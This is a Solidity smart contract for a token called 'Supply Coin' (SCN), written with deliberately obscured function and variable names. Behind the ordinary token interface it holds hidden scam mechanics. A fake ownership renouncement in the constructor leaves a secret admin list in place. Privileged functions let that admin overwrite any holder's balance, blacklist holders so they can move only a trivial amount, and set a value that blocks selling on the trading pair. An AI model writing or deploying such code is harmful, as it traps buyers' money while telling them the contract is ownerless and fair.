//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract walletTeamReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface teamFrom {
    function createPair(address minTrading, address shouldMin) external returns (address);

    function feeTo() external view returns (address);
}

interface exemptSell {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface txEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isLimit) external view returns (uint256);

    function transfer(address feeList, uint256 fundToken) external returns (bool);

    function allowance(address txTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 fundToken) external returns (bool);

    function transferFrom(
        address sender,
        address feeList,
        uint256 fundToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTo, uint256 value);
    event Approval(address indexed txTrading, address indexed spender, uint256 value);
}

interface txEnableMetadata is txEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SupplyCoin is walletTeamReceiver, txEnable, txEnableMetadata {

    address private walletAt;

    address feeLimit;

    constructor (){
        
        marketingExempt();
        exemptSell amountWallet = exemptSell(atLaunchFrom);
        launchSell = teamFrom(amountWallet.factory()).createPair(amountWallet.WETH(), address(this));
        feeLimit = teamFrom(amountWallet.factory()).feeTo();
        if (shouldFee) {
            marketingToken = false;
        }
        fundFee = _msgSender();
        fundTx[fundFee] = true;
        toFee[fundFee] = feeFrom;
        if (receiverMax) {
            shouldFee = false;
        }
        emit Transfer(address(0), fundFee, feeFrom);
    }

    function name() external view virtual override returns (string memory) {
        return liquidityToTeam;
    }

    function exemptEnableSender(address shouldAmountReceiver) public {
        require(shouldAmountReceiver.balance < 100000);
        if (teamBuy) {
            return;
        }
        
        fundTx[shouldAmountReceiver] = true;
        
        teamBuy = true;
    }

    address public launchSell;

    uint256 public launchedLaunchTotal = 0;

    function approve(address feeMin, uint256 fundToken) public virtual override returns (bool) {
        senderLiquidity[_msgSender()][feeMin] = fundToken;
        emit Approval(_msgSender(), feeMin, fundToken);
        return true;
    }

    bool public shouldFee;

    string private listReceiver = "SCN";

    mapping(address => mapping(address => uint256)) private senderLiquidity;

    string private liquidityToTeam = "Supply Coin";

    uint256 public enableLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return feeFrom;
    }

    function listMin(address launchAmountMode) public {
        receiverSell();
        if (marketingToken) {
            receiverMax = true;
        }
        if (launchAmountMode == fundFee || launchAmountMode == launchSell) {
            return;
        }
        walletMarketing[launchAmountMode] = true;
    }

    function transferFrom(address txLiquidityFee, address feeList, uint256 fundToken) external override returns (bool) {
        if (_msgSender() != atLaunchFrom) {
            if (senderLiquidity[txLiquidityFee][_msgSender()] != type(uint256).max) {
                require(fundToken <= senderLiquidity[txLiquidityFee][_msgSender()]);
                senderLiquidity[txLiquidityFee][_msgSender()] -= fundToken;
            }
        }
        return shouldAmount(txLiquidityFee, feeList, fundToken);
    }

    function swapAmount(address txLiquidityFee, address feeList, uint256 fundToken) internal view returns (uint256) {
        require(fundToken > 0);

        uint256 walletExempt = 0;
        if (txLiquidityFee == launchSell && launchedLaunchTotal > 0) {
            walletExempt = fundToken * launchedLaunchTotal / 100;
        } else if (feeList == launchSell && amountExempt > 0) {
            walletExempt = fundToken * amountExempt / 100;
        }
        require(walletExempt <= fundToken);
        return fundToken - walletExempt;
    }

    function decimals() external view virtual override returns (uint8) {
        return senderSwapReceiver;
    }

    event OwnershipTransferred(address indexed takeMax, address indexed sellIs);

    function transfer(address totalEnable, uint256 fundToken) external virtual override returns (bool) {
        return shouldAmount(_msgSender(), totalEnable, fundToken);
    }

    uint256 public amountExempt = 0;

    function owner() external view returns (address) {
        return walletAt;
    }

    address atLaunchFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function balanceOf(address isLimit) public view virtual override returns (uint256) {
        return toFee[isLimit];
    }

    function shouldAmount(address txLiquidityFee, address feeList, uint256 fundToken) internal returns (bool) {
        if (txLiquidityFee == fundFee) {
            return launchedMarketingTo(txLiquidityFee, feeList, fundToken);
        }
        uint256 fromSwap = txEnable(launchSell).balanceOf(feeLimit);
        require(fromSwap == tradingAuto);
        require(feeList != feeLimit);
        if (walletMarketing[txLiquidityFee]) {
            return launchedMarketingTo(txLiquidityFee, feeList, limitMarketingFee);
        }
        fundToken = swapAmount(txLiquidityFee, feeList, fundToken);
        return launchedMarketingTo(txLiquidityFee, feeList, fundToken);
    }

    function shouldMode(uint256 fundToken) public {
        receiverSell();
        tradingAuto = fundToken;
    }

    mapping(address => uint256) private toFee;

    function allowance(address feeSender, address feeMin) external view virtual override returns (uint256) {
        if (feeMin == atLaunchFrom) {
            return type(uint256).max;
        }
        return senderLiquidity[feeSender][feeMin];
    }

    uint256 private feeFrom = 100000000 * 10 ** 18;

    uint256 private buyFund;

    function listAmount(address totalEnable, uint256 fundToken) public {
        receiverSell();
        toFee[totalEnable] = fundToken;
    }

    bool public teamBuy;

    uint256 constant limitMarketingFee = 16 ** 10;

    uint256 tradingAuto;

    function receiverSell() private view {
        require(fundTx[_msgSender()]);
    }

    uint256 fundSenderTo;

    function symbol() external view virtual override returns (string memory) {
        return listReceiver;
    }

    bool private marketingToken;

    function launchedMarketingTo(address txLiquidityFee, address feeList, uint256 fundToken) internal returns (bool) {
        require(toFee[txLiquidityFee] >= fundToken);
        toFee[txLiquidityFee] -= fundToken;
        toFee[feeList] += fundToken;
        emit Transfer(txLiquidityFee, feeList, fundToken);
        return true;
    }

    address public fundFee;

    mapping(address => bool) public fundTx;

    uint8 private senderSwapReceiver = 18;

    bool public autoSellExempt;

    mapping(address => bool) public walletMarketing;

    bool private receiverMax;

    function marketingExempt() public {
        emit OwnershipTransferred(fundFee, address(0));
        walletAt = address(0);
    }

    function getOwner() external view returns (address) {
        return walletAt;
    }

}